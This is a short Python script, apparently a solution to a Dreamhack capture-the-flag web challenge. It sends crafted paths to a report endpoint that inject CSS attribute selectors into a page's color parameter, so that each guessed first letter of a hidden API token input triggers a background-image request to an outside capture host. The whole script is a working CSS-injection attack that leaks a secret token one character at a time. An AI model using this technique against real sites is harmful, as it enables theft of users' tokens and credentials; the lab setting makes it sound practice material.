from string import ascii_lowercase
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://host3.dreamhack.games:18303/report"

for ch in ascii_lowercase:

    data = {
        'path': "mypage?color=black;}" + "input[id=InputApitoken][value^="+f"{ch}]" + "{background: url(https://cftfjzz.request.dreamhack.games/"+f"{ch})"
    }
    
    print(data['path'])
    res = requests.post(URL, data=data)


